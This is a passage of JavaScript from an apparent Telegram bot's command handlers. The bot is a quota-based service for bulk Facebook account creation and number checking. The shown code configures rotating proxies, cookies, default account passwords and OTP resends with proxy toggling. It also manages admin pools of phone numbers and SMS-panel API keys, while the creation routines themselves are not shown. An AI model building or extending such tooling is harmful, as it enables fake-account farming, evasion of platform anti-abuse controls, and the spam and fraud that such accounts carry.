    if (session.kind === 'awaiting_remove_proxy') {
      promptSessions.delete(uid);
      const list = readUserProxies(uid);
      const idxNum = Number(text);
      const normTarget = validateProxyUrl(text);
      let next = list;
      if (Number.isInteger(idxNum) && idxNum >= 1 && idxNum <= list.length) {
        next = list.filter((_, i) => i !== idxNum - 1);
      } else {
        next = list.filter((p) => p !== text && (!normTarget || p !== normTarget));
      }
      writeUserProxies(uid, next);
      await sendMessage(chatId, `✅ Proxy removed. Remaining proxies: <code>${next.length}</code>.`);
      await renderProxiesMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_cookies') {
      promptSessions.delete(uid);
      const saved = writeUserCookies(uid, text);
      await sendMessage(chatId, `✅ Base cookies saved & normalized:\n<blockquote><code>${escapeHtml(saved)}</code></blockquote>`);
      await renderCookiesMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_cc') {
      const cleanCc = text.replace(/\D/g, '');
      if (!cleanCc || cleanCc.length > 4) {
        await sendMessage(chatId, '❌ Invalid country code. Send digits only (e.g. <code>880</code>, <code>91</code>, <code>1</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { cc: cleanCc });
      await sendMessage(chatId, `✅ Country code updated to <code>+${escapeHtml(cleanCc)}</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_password') {
      if (text.length < 6) {
        await sendMessage(chatId, '❌ Password must be at least 6 characters. Try again:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { password: text });
      await sendMessage(chatId, `✅ Default account password updated (${text.length} chars).`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_default_proxy') {
      if (text === '-') {
        promptSessions.delete(uid);
        writeUserConfig(uid, { proxy: '' });
        await sendMessage(chatId, '✅ Default proxy cleared.');
        await renderSettings(chatId, uid);
        return;
      }
      const normPx = validateProxyUrl(text);
      if (!normPx) {
        await sendMessage(
          chatId,
          `❌ Invalid proxy format. Try:\n• <code>user:pass:host:port</code>\n• <code>host:port:user:pass</code>\n• <code>http://user:pass@ip:port</code>\n• <code>socks5://ip:port</code>\nOr send <code>-</code> to clear:`,
          { inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]] }
        );
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { proxy: normPx });
      await sendMessage(chatId, `✅ Default proxy set to <code>${escapeHtml(normPx)}</code>`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_delay') {
      const sec = Number(text);
      if (!Number.isFinite(sec) || sec < 0 || sec > 3600) {
        await sendMessage(chatId, '❌ Enter a valid delay between <code>0</code> and <code>3600</code> seconds:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { delay: Math.floor(sec) });
      await sendMessage(chatId, `✅ Delay updated to <code>${Math.floor(sec)}s</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_batch') {
      const b = Number(text);
      if (!Number.isFinite(b) || b < 0 || b > 500) {
        await sendMessage(chatId, '❌ Enter batch size (<code>0</code> = off, or <code>1–500</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { batch: Math.floor(b) });
      await sendMessage(chatId, `✅ Batch break size updated to <code>${Math.floor(b)}</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_retries') {
      const rt = Number(text);
      if (!Number.isFinite(rt) || rt < 2 || rt > 12) {
        await sendMessage(chatId, '❌ Enter retries between <code>2</code> and <code>12</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { retries: Math.floor(rt) });
      await sendMessage(chatId, `✅ Retries updated to <code>${Math.floor(rt)}</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_timeout') {
      const to = Number(text);
      if (!Number.isFinite(to) || to < 5 || to > 120) {
        await sendMessage(chatId, '❌ Enter timeout between <code>5</code> and <code>120</code> seconds:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { timeout: Math.floor(to) });
      await sendMessage(chatId, `✅ Request timeout updated to <code>${Math.floor(to)}s</code>.`);
      await renderSettings(chatId, uid);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_broadcast') {
      promptSessions.delete(uid);
      const sent = await broadcastMessage(text);
      await sendMessage(chatId, `📣 Broadcast delivered to <code>${sent}</code> approved users.`);
      await renderAdminHome(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_global_proxies') {
      promptSessions.delete(uid);
      const additions = parseProxyLines(text);
      if (additions.length === 0) {
        await sendMessage(chatId, '❌ No valid proxies recognized. Supported: <code>user:pass:host:port</code>, <code>http://user:pass@ip:port</code>, <code>socks5://ip:port</code>.', {
          inline_keyboard: [[btnOk('➕ Try Again', 'admin:px_add'), btnBad('❌ Cancel', 'admin:proxies')]],
        });
        return;
      }
      writeGlobalProxies([...readGlobalProxies(), ...additions]);
      await sendMessage(chatId, `✅ Added <code>${additions.length}</code> proxies. Global pool now has <code>${readGlobalProxies().length}</code> proxies.`);
      await renderAdminGlobalProxies(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_default_limit') {
      const lim = Number(text);
      if (!Number.isFinite(lim) || lim < 1 || lim > 100000) {
        await sendMessage(chatId, '❌ Enter a limit between <code>1</code> and <code>100000</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:settings')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeSettings({ defaultDailyLimit: Math.floor(lim) });
      await sendMessage(chatId, `✅ Default daily limit updated to <code>${Math.floor(lim)}</code>.`);
      await renderAdminSettings(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_welcome') {
      promptSessions.delete(uid);
      writeSettings({ welcomeNote: text.slice(0, 300) });
      await sendMessage(chatId, `✅ Welcome note updated.`);
      await renderAdminBrandMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_brand') {
      const cleanBrand = text.trim().slice(0, 40);
      if (!cleanBrand) {
        await sendMessage(chatId, '❌ Enter a valid brand name (1-40 chars):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:brand')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeSettings({ brandName: cleanBrand });
      await sendMessage(chatId, `✅ Brand name updated to <code>${escapeHtml(cleanBrand)}</code>.`);
      await renderAdminBrandMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_owner') {
      const norm = normalizeTgLink(text, DEFAULT_OWNER_URL);
      promptSessions.delete(uid);
      writeSettings({ adminUsername: norm.handle, ownerUrl: norm.url });
      await sendMessage(chatId, `✅ Owner updated to ${escapeHtml(norm.handle)} (<code>${escapeHtml(norm.url)}</code>).`);
      await renderAdminBrandMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_channel') {
      const norm = normalizeTgLink(text, DEFAULT_CHANNEL_URL);
      promptSessions.delete(uid);
      writeSettings({ channelUrl: norm.url });
      await sendMessage(chatId, `✅ Channel updated to <code>${escapeHtml(norm.url)}</code>.`);
      await renderAdminBrandMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_find_user') {
      promptSessions.delete(uid);
      const q = text.trim().replace(/^@/, '').toLowerCase();
      const users = Object.values(readUsersMap());
      const matches = users.filter(
        (u) =>
          u.id === q ||
          (u.username && u.username.toLowerCase().includes(q)) ||
          (u.firstName && u.firstName.toLowerCase().includes(q))
      );
      if (matches.length === 1) {
        await renderAdminUserDetail(chatId, matches[0].id);
      } else if (matches.length > 1) {
        const rows = matches.slice(0, 8).map((u) => [btnNav(`${u.firstName} (${u.id})`, `admin:uview:${u.id}`)]);
        rows.push([btnNav('⬅️ Back to Users', 'admin:users')]);
        await sendMessage(chatId, `🔍 <b>FOUND ${matches.length} USERS</b>\n${DIVIDER}\nSelect a user:`, { inline_keyboard: rows });
      } else {
        await sendMessage(chatId, `❌ No user matched <code>${escapeHtml(text)}</code>.`, {
          inline_keyboard: [[btnNav('🔍 Try Again', 'admin:ufind'), btnNav('⬅️ Users List', 'admin:users')]],
        });
      }
      return;
    }

    if (session.kind === 'awaiting_fbcreate_count') {
      const n = Number(text);
      if (!Number.isInteger(n) || n < 1 || n > 50) {
        await sendMessage(chatId, '❌ Enter an account count between <code>1</code> and <code>50</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'menu:fb_auto_create')]],
        });
        return;
      }
      promptSessions.delete(uid);
      const cfgNow = readUserConfig(uid);
      await startFbAutoCreateRun(chatId, user, session.countryId || cfgNow.fb_create_country_id, n);
      return;
    }

    if (session.kind === 'awaiting_fbtools_pw') {
      const pw = text.trim();
      if (pw.length < 6) {
        await sendMessage(chatId, '❌ পাসওয়ার্ড কমপক্ষে <code>6</code> অক্ষরের হতে হবে। আবার দিন:', {
          inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { fb_tools_password: pw });
      await sendMessage(chatId, `✅ পাসওয়ার্ড সেভ হয়েছে (<code>${pw.length} অক্ষর</code>)।`);
      await renderFbToolsMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_fbtools_2oo9_keys' || session.kind === 'awaiting_fbtools_lamix_token') {
      promptSessions.delete(uid);
      await sendMessage(chatId, '⛔ API Key শুধুমাত্র অ্যাডমিন প্যানেল থেকে সেট করা যাবে।', {
        inline_keyboard: [[btnNav('⬅️ FB Tools মেনু', 'menu:fb_tools')]],
      });
      return;
    }

    if (session.kind === 'awaiting_fbtools_count') {
      const cleanDigits = text.replace(/[০-৯]/g, (d) => '০১২৩৪৫৬৭৮৯'.indexOf(d)).replace(/\D/g, '');
      const n = Number(cleanDigits);
      if (!Number.isInteger(n) || n < 1 || n > 15) {
        await sendMessage(chatId, '❌ <code>1</code> থেকে <code>15</code> এর মধ্যে একটি সংখ্যা লিখুন:', {
          inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]],
        });
        return;
      }
      promptSessions.delete(uid);
      await startFbToolsBatch(chatId, user, { count: n });
      return;
    }

    if (session.kind === 'awaiting_fbtools_otp_resends') {
      const cleanDigits = text.replace(/[০-৯]/g, (d) => '০১২৩৪৫৬৭৮৯'.indexOf(d)).replace(/\D/g, '');
      const n = Number(cleanDigits);
      if (!Number.isInteger(n) || n < 1 || n > 10) {
        await sendMessage(chatId, '❌ <code>1</code> থেকে <code>10</code> এর মধ্যে একটি সংখ্যা লিখুন:', {
          inline_keyboard: [[btnBad('❌ বাতিল', 'menu:fb_tools')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeUserConfig(uid, { fb_tools_otp_resends: n });
      await sendMessage(chatId, `✅ অটো OTP সেন্ড/রিসেন্ড সংখ্যা <code>${n} বার</code> সেট হয়েছে! (প্রতিবার কান্ট্রি প্রক্সি ON→OFF হবে)`);
      await renderFbToolsMenu(chatId, uid);
      return;
    }

    if (session.kind === 'awaiting_fbtools_custom_nums') {
      promptSessions.delete(uid);
      const cfgNow = readUserConfig(uid);
      const nums = Array.from(
        new Set(
          text
            .split(/[\r\n,\s]+/)
            .map((t) => normNumber(t.trim(), cfgNow.cc))
            .filter(Boolean)
        )
      );
      await startFbToolsBatch(chatId, user, { source: 'custom', customNumbers: nums });
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_country_name') {
      const cleanName = text.trim();
      if (!cleanName || cleanName.length < 2) {
        await sendMessage(chatId, '❌ Send a valid country name (e.g. <code>BD +880</code> or <code>Nigeria +234</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]],
        });
        return;
      }
      promptSessions.delete(uid);
      const res = addAdminCountry(cleanName);
      if (!res.ok) {
        await sendMessage(chatId, `⚠️ Country <b>${escapeHtml(cleanName)}</b> already exists.`);
      } else {
        pushBotLog(`Admin added country: ${res.country.name}`);
        await sendMessage(chatId, `✅ Country <b>${escapeHtml(res.country.name)}</b> added!`);
      }
      await renderAdminCountries(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_country_numbers') {
      const rawCells = parseTxtBuffer(Buffer.from(text, 'utf-8'));
      const uniqueParsed = normalizeUniquePoolNumbers(rawCells);
      if (uniqueParsed.length === 0) {
        await sendMessage(
          chatId,
          '❌ No valid phone numbers detected (7–15 digits). Paste numbers one per line or upload a <code>.txt</code>, <code>.csv</code>, or <code>.xlsx</code> file:',
          { inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]] }
        );
        return;
      }
      if (uniqueParsed.length > MAX_NUMBERS_PER_UPLOAD) {
        await sendMessage(chatId, `❌ Too many unique numbers (max ${MAX_NUMBERS_PER_UPLOAD}).`, {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]],
        });
        return;
      }
      promptSessions.delete(uid);
      const addRes = addNumbersToAdminCountry(session.countryId, uniqueParsed);
      if (!addRes.ok) {
        await sendMessage(chatId, '❌ Selected country not found.', {
          inline_keyboard: [[btnNav('⬅️ Countries Menu', 'admin:countries')]],
        });
        return;
      }
      pushBotLog(`Admin pasted ${addRes.added} numbers to ${addRes.country.name}`);
      await sendMessage(
        chatId,
        `✅ <b>Added <code>${addRes.added}</code> numbers to ${escapeHtml(addRes.country.name)}</b> (♻️ <code>${addRes.skippedDupes}</code> duplicates skipped).`
      );
      await renderAdminCountries(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_valid_time') {
      const mins = Number(text);
      if (!Number.isInteger(mins) || mins < 1 || mins > 10080) {
        await sendMessage(chatId, '❌ Enter valid time in minutes (<code>1–10080</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:countries')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeSettings({ numberValidMinutes: mins });
      pushBotLog(`Admin set numberValidMinutes = ${mins} min`);
      await sendMessage(chatId, `✅ Number Valid Time updated to <code>${mins} minute(s)</code>.`);
      await renderAdminCountries(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_lamix_token') {
      promptSessions.delete(uid);
      const clean = text.trim() === '-' ? '' : text.trim();
      writeSettings({ globalLamixToken: clean, globalLamixCleared: !clean, _apiKeysMigrated: true });
      fbToolsLamixRangeCache.clear();
      pushBotLog(`Admin ${clean ? 'updated' : 'cleared'} global Lamix API token`);
      await sendMessage(chatId, clean ? '✅ Global Lamix Bearer Token saved for all users (hidden from user UI).' : '🗑 Global Lamix Bearer Token cleared.');
      await renderAdminApiKeysMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_voltex_keys') {
      promptSessions.delete(uid);
      const raw = text.trim();
      if (raw === '-') {
        writeSettings({ globalVoltexKeys: [], globalVoltexDisabled: true, _apiKeysMigrated: true });
        fbTools2oo9RangeCache.clear();
        pushBotLog('Admin cleared/disabled global Voltex/2oo9 API keys');
        await sendMessage(chatId, '🗑 Global Voltex / 2oo9 API Keys cleared and disabled.');
      } else if (raw.toLowerCase() === 'default') {
        writeSettings({ globalVoltexKeys: [], globalVoltexDisabled: false, _apiKeysMigrated: true });
        fbTools2oo9RangeCache.clear();
        pushBotLog('Admin reset global Voltex/2oo9 keys to default');
        await sendMessage(chatId, '♻️ Global Voltex / 2oo9 reset to default key.');
      } else {
        const clean = raw.split(/[\r\n,\s]+/).map((s) => s.trim()).filter(Boolean);
        writeSettings({ globalVoltexKeys: clean, globalVoltexDisabled: false, _apiKeysMigrated: true });
        fbTools2oo9RangeCache.clear();
        pushBotLog(`Admin saved ${clean.length} global Voltex/2oo9 key(s)`);
        await sendMessage(chatId, `✅ Saved <code>${clean.length}</code> Global Voltex / 2oo9 key(s) for all users (hidden from user UI).`);
      }
      await renderAdminApiKeysMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_voltex_url') {
      const raw = text.trim();
      if (raw === '-' || raw.toLowerCase() === 'default') {
        promptSessions.delete(uid);
        writeSettings({ globalVoltexBaseUrl: '', _apiKeysMigrated: true });
        fbTools2oo9RangeCache.clear();
        await sendMessage(chatId, `♻️ Global Voltex Base URL reset to default.`);
        await renderAdminApiKeysMenu(chatId);
        return;
      }
      let valid = false;
      try {
        const u = new URL(raw);
        valid = (u.protocol === 'http:' || u.protocol === 'https:') && Boolean(u.host);
      } catch {
        valid = false;
      }
      if (!valid) {
        await sendMessage(chatId, '❌ Invalid URL. Send full <code>https://...</code> Voltex API base URL (or <code>default</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:apikeys')]],
        });
        return;
      }
      promptSessions.delete(uid);
      writeSettings({ globalVoltexBaseUrl: raw.replace(/\/+$/, ''), _apiKeysMigrated: true });
      fbTools2oo9RangeCache.clear();
      pushBotLog(`Admin updated global Voltex base URL`);
      await sendMessage(chatId, `✅ Global Voltex Base URL updated to <code>${escapeHtml(raw.replace(/\/+$/, ''))}</code>.`);
      await renderAdminApiKeysMenu(chatId);
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_add_name') {
      const pName = text.trim().slice(0, 60);
      if (!pName) {
        await sendMessage(chatId, '❌ Enter a valid Panel Name:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:panels')]],
        });
        return;
      }
      promptSessions.set(uid, { kind: 'admin_panel_add_url', draft: { name: pName } });
      await sendMessage(
        chatId,
        `🔌 <b>ADD API PANEL (2/4)</b>\nPanel: <b>${escapeHtml(pName)}</b>\n\nSend the full API endpoint URL (starting with <code>http://</code> or <code>https://</code>):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'admin:panels')]] }
      );
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_add_url') {
      const rawUrl = text.trim();
      let validUrl = false;
      try {
        const u = new URL(rawUrl);
        validUrl = (u.protocol === 'http:' || u.protocol === 'https:') && Boolean(u.host);
      } catch {
        validUrl = false;
      }
      if (!validUrl) {
        await sendMessage(chatId, '❌ Invalid URL. Send a full <code>http://</code> or <code>https://</code> URL:', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:panels')]],
        });
        return;
      }
      promptSessions.set(uid, { kind: 'admin_panel_add_key', draft: { ...session.draft, stats_url: rawUrl } });
      await sendMessage(
        chatId,
        `🔌 <b>ADD API PANEL (3/4)</b>\n\nSend the API Token / Key (or send <code>none</code> if no authentication is needed):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'admin:panels')]] }
      );
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_add_key') {
      const rawKey = text.trim();
      const finalKey = ['none', 'null', '-', 'no'].includes(rawKey.toLowerCase()) ? '' : rawKey;
      promptSessions.set(uid, { kind: 'admin_panel_add_interval', draft: { ...session.draft, api_key: finalKey } });
      await sendMessage(
        chatId,
        `🔌 <b>ADD API PANEL (4/4)</b>\n\nEnter Scan Interval in seconds (minimum <code>3</code>, recommended <code>5</code>):`,
        { inline_keyboard: [[btnBad('❌ Cancel', 'admin:panels')]] }
      );
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_add_interval') {
      const sec = Number(text);
      if (!Number.isInteger(sec) || sec < 3 || sec > 86400) {
        await sendMessage(chatId, '❌ Scan interval must be a whole number <code>&gt;= 3</code> seconds (max <code>86400</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', 'admin:panels')]],
        });
        return;
      }
      const draft = session.draft || {};
      promptSessions.delete(uid);
      const panel = addAdminApiPanel({
        name: draft.name,
        stats_url: draft.stats_url,
        api_key: draft.api_key || '',
        scan_interval: sec,
      });
      pushBotLog(`Admin added API panel "${panel.name}" (interval ${sec}s)`);
      await sendMessage(chatId, `✅ <b>API Panel Added!</b>\n📡 <b>${escapeHtml(panel.name)}</b> (⏱ <code>${panel.scan_interval}s</code>)`);
      await renderAdminPanelDetail(chatId, panel.id);
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_set_interval') {
      const sec = Number(text);
      if (!Number.isInteger(sec) || sec < 3 || sec > 86400) {
        await sendMessage(chatId, '❌ Enter a scan interval of at least <code>3</code> seconds (<code>3–86400</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${session.panelId}`)]],
        });
        return;
      }
      promptSessions.delete(uid);
      updatePanelById(session.panelId, { scan_interval: sec });
      await sendMessage(chatId, `✅ Scan interval updated to <code>${sec}s</code>.`);
      await renderAdminPanelDetail(chatId, session.panelId);
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_set_authname') {
      const paramName = text.trim();
      if (!paramName || /\s/.test(paramName)) {
        await sendMessage(chatId, '❌ Enter a valid header/parameter name without spaces (e.g. <code>mauthapi</code> or <code>api_key</code>):', {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_auth:${session.panelId}`)]],
        });
        return;
      }
      promptSessions.delete(uid);
      updatePanelById(session.panelId, {
        api_auth_type: session.authType,
        api_auth_name: paramName,
        api_last_error: '',
      });
      forgetPanelRuntimeState(session.panelId);
      await sendMessage(chatId, `✅ Auth set to <code>${escapeHtml(session.authType)}:${escapeHtml(paramName)}</code>.`);
      await renderAdminPanelDetail(chatId, session.panelId);
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_set_mapping') {
      const rawMap = text.trim();
      promptSessions.delete(uid);
      if (['none', 'auto', '-'].includes(rawMap.toLowerCase())) {
        updatePanelById(session.panelId, {
          api_rows_path: '',
          api_number_field: '',
          api_sender_field: '',
          api_message_field: '',
          api_timestamp_field: '',
          api_range_field: '',
        });
        forgetPanelRuntimeState(session.panelId);
        await sendMessage(chatId, '✅ JSON Mapping reset to <code>auto-detect</code>.');
      } else {
        const parsedMap = _parseApiMapping(rawMap);
        if (Object.keys(parsedMap).length === 0) {
          await sendMessage(
            chatId,
            `❌ Invalid mapping format. Use key=value pairs like:\n<code>rows=data;number=phone;sender=cli;message=sms;time=date;range=country</code>\nor send <code>auto</code> to clear:`,
            { inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${session.panelId}`)]] }
          );
          promptSessions.set(uid, session);
          return;
        }
        updatePanelById(session.panelId, {
          api_rows_path: parsedMap.api_rows_path || '',
          api_number_field: parsedMap.api_number_field || '',
          api_sender_field: parsedMap.api_sender_field || '',
          api_message_field: parsedMap.api_message_field || '',
          api_timestamp_field: parsedMap.api_timestamp_field || '',
          api_range_field: parsedMap.api_range_field || '',
        });
        forgetPanelRuntimeState(session.panelId);
        await sendMessage(chatId, '✅ Custom JSON Mapping updated.');
      }
      await renderAdminPanelDetail(chatId, session.panelId);
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_cols_num') {
      const col = Number(text);
      if (!Number.isInteger(col) || col < 1 || col > 50) {
        await sendMessage(chatId, '❌ Enter a 1-based column number (<code>&gt;= 1</code>) for <b>Number</b>:', {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${session.panelId}`)]],
        });
        return;
      }
      promptSessions.set(uid, { kind: 'admin_panel_cols_sender', panelId: session.panelId, numIdx: col - 1 });
      await sendMessage(chatId, `✏️ <b>EDIT COLUMNS (2/3)</b>\nNumber Col = <code>${col}</code>\n\nEnter 1-based column number for <b>Sender / CLI</b> (e.g. <code>4</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${session.panelId}`)]],
      });
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_cols_sender') {
      const col = Number(text);
      if (!Number.isInteger(col) || col < 1 || col > 50) {
        await sendMessage(chatId, '❌ Enter a 1-based column number (<code>&gt;= 1</code>) for <b>Sender</b>:', {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${session.panelId}`)]],
        });
        return;
      }
      promptSessions.set(uid, {
        kind: 'admin_panel_cols_msg',
        panelId: session.panelId,
        numIdx: session.numIdx,
        senderIdx: col - 1,
      });
      await sendMessage(chatId, `✏️ <b>EDIT COLUMNS (3/3)</b>\nSender Col = <code>${col}</code>\n\nEnter 1-based column number for <b>Message / SMS</b> (e.g. <code>6</code>):`, {
        inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${session.panelId}`)]],
      });
      return;
    }

    if (isAdmin && session.kind === 'admin_panel_cols_msg') {
      const col = Number(text);
      if (!Number.isInteger(col) || col < 1 || col > 50) {
        await sendMessage(chatId, '❌ Enter a 1-based column number (<code>&gt;= 1</code>) for <b>Message</b>:', {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:panel_view:${session.panelId}`)]],
        });
        return;
      }
      promptSessions.delete(uid);
      updatePanelById(session.panelId, {
        number_col_idx: session.numIdx,
        sender_col_idx: session.senderIdx,
        message_col_idx: col - 1,
      });
      forgetPanelRuntimeState(session.panelId);
      await sendMessage(
        chatId,
        `✅ Columns updated (1-based): Number=<code>${session.numIdx + 1}</code>, Sender=<code>${session.senderIdx + 1}</code>, Msg=<code>${col}</code>`
      );
      await renderAdminPanelDetail(chatId, session.panelId);
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_dm') {
      const targetId = session.targetUserId;
      promptSessions.delete(uid);
      const stNow = readSettings();
      const sent = await sendMessage(
        targetId,
        `📩 <b>MESSAGE FROM ${escapeHtml(stNow.brandName || DEFAULT_BRAND_NAME)} ADMIN</b>\n${DIVIDER}\n<blockquote>${escapeHtml(text)}</blockquote>`,
        {
          inline_keyboard: [
            [
              btnUrl('👑 Contact Owner', stNow.ownerUrl || DEFAULT_OWNER_URL, 'success'),
              btnNav('⬅️ Main Menu', 'menu:home'),
            ],
          ],
        }
      );
      await sendMessage(chatId, sent.ok ? `✅ DM delivered to <code>${escapeHtml(targetId)}</code>.` : `❌ Failed to DM user (<code>${escapeHtml(sent.description || 'blocked/unreachable')}</code>).`, {
        inline_keyboard: [[btnNav('⬅️ User Profile', `admin:uview:${targetId}`)]],
      });
      return;
    }

    if (isAdmin && session.kind === 'admin_awaiting_user_limit') {
      const lim = Number(text);
      if (!Number.isFinite(lim) || lim < 0 || lim > 100000) {
        await sendMessage(chatId, '❌ Enter a limit between <code>0</code> and <code>100000</code>:', {
          inline_keyboard: [[btnBad('❌ Cancel', `admin:uview:${session.targetUserId}`)]],
        });
        return;
      }
      promptSessions.delete(uid);
      const map = readUsersMap();
      if (map[session.targetUserId]) {
        map[session.targetUserId].dailyLimit = Math.floor(lim);
        writeUsersMap(map);
      }
      await sendMessage(chatId, `✅ User <code>${escapeHtml(session.targetUserId)}</code> daily limit set to <code>${Math.floor(lim)}</code>.`);
      await renderAdminUserDetail(chatId, session.targetUserId);
    }
  }

  async function processCallback(cb) {
    tgCall('answerCallbackQuery', { callback_query_id: cb.id }, undefined, { noRetry: true }).catch(() => {});
    if (!cb.message) return;
    const chatId = cb.message.chat.id;
    const msgId = cb.message.message_id;
    const st = readSettings();
    const user = getOrCreateUser(cb.from);
    const uid = user.id;
    const isAdmin = isUserAdmin(user, st);
    const data = cb.data || '';

    if (data === 'menu:home' || data === 'prompt:cancel') {
      promptSessions.delete(uid);
      await renderHome(chatId, cb.from, msgId);
      return;
    }

    if (st.maintenanceMode && !isAdmin) {
      await renderHome(chatId, cb.from, msgId);
      return;
    }

    if (user.status === 'blocked' || (user.status !== 'approved' && !isAdmin)) {
      await renderHome(chatId, cb.from, msgId);
      return;
    }

    if (!isAdmin && st.requireChannelJoin) {
      const ch = await checkChannelMembership(uid, st);
      if (!ch.ok) {
        await renderHome(chatId, cb.from, msgId);
        return;
      }
    }

    if (data === 'menu:help') {
      promptSessions.delete(uid);
      await renderHelpMenu(chatId, isAdmin, st, msgId);
      return;
    }

    if (data === 'menu:support') {
      promptSessions.delete(uid);
      await renderSupportMenu(chatId, msgId);
      return;
    }

    if (data === 'menu:run') {
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:toggle_resume') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { resume_mode: cfg.resume_mode === false });
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:toggle_gql') {
      const cfg = readUserConfig(uid);
      writeUserConfig(uid, { precheck_gql: cfg.precheck_gql === false });
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:turbo') {
      writeUserConfig(uid, { delay: 0, batch: 0, retries: 3, timeout: 15, threads: 6 });
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:cycle_threads') {
      const cfg = readUserConfig(uid);
      const order = [1, 2, 3, 4, 5, 6, 8];
      const cur = order.indexOf(Number(cfg.threads ?? 4));
      const next = order[(cur + 1) % order.length];
      writeUserConfig(uid, { threads: next });
      await renderRunPrompt(chatId, uid, msgId);
      return;
    }

    if (data === 'run:clear_done') {
      clearUserDone(uid);
      await sendMessage(chatId, `🧹 Cleared your processed numbers (<code>done.txt</code>) history.`);
      await renderHome(chatId, cb.from);
      return;
    }

    if (data === 'menu:stats') {
      promptSessions.delete(uid);
      const accounts = readUserAccounts(uid);
      const pending = readUserPending(uid);
      const doneCnt = readUserDone(uid).size;
      const pxCnt = readUserProxies(uid).length;
      const ok = accounts.filter((a) => a.status === 'OK').length;
      const used = accounts.filter((a) => a.status === 'USED').length;
      const limit = accounts.filter((a) => a.status === 'LIMIT').length;
      const fail = accounts.filter((a) => a.status === 'FAIL' || a.status === 'BADNUM').length;
      const quotaBar = renderProgressBar(user.usedToday, user.dailyLimit, 10);
      const totalTried = ok + used + limit + fail;
